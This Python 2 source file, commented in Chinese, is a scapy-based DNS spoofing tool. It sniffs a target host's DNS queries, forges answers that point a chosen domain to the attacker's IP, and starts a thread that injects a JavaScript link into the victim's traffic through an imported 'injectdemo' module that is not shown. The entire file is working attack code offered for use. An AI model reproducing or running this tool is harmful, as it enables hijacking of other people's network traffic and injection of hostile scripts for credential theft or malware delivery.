# coding:utf-8

from scapy.all import *
import time
import logging
import injectdemo
import threading

"""DNS欺骗，伪造DNS响应包"""

class dnsspoofer():

    """初始化"""

    def __init__(self,localip,targetip,domain,times,jslink):
        self.dnsip = localip
        self.targetdomain = domain
        self.targetip = targetip
        self.times = 0
        self.step = times
        self.jslink = jslink


    """对符合条件的查询请求包进行处理，
    然后伪造响应包返回给目标主机"""

    def send_response(self,x):
        # Get the requested domain
        req_domain = x[DNS].qd.qname
        if (self.targetdomain in req_domain) and (self.times < self.step):
            print '[*] Found request for:' + req_domain
            

            del(x[UDP].len)    
            del(x[UDP].chksum)
            del(x[IP].len)
            del(x[IP].chksum)
            
            """伪造DNS响应包，主要通过请求包的信息，
            伪造对应的响应包，然后将响应包发送给目标主机"""

            response = x.copy()
            response.src,response.dst = x.dst,x.src
            response[IP].src,response[IP].dst = x[IP].dst,x[IP].src

            response.sport,response.dport = x.dport,x.sport

            response[DNS].qr = 1L
            response[DNS].ra = 1L
            response[DNS].ancount = 1

            response[DNS].an = DNSRR(
                rrname = req_domain,
                type = 'A',
                rclass = 'IN',
                ttl = 900,
                rdata = self.dnsip
                )
            
            """将伪造好的DNS响应包返回给目标主机，
            之后尝试进行伪造响应包并向数据包注入JS文件"""

            sendp(response,verbose=False)
            print '[*] Sent response:' + self.targetdomain + ' -> ' + self.dnsip 
            inject = threading.Thread(name="injectdat",target=injectdemo.injectdata,args=(self.targetdomain,self.dnsip,self.jslink,))
            inject.start()
            self.times += 1


    """开启DNS欺骗，嗅探DNS查询包"""

    def start(self):
        
        print '[*] Starting to intercept [CTRL+C to stop]'
        sniff(prn=lambda x: self.send_response(x),lfilter=lambda x:x.haslayer(UDP) and x.dport == 53,filter="host %s" % self.targetip)
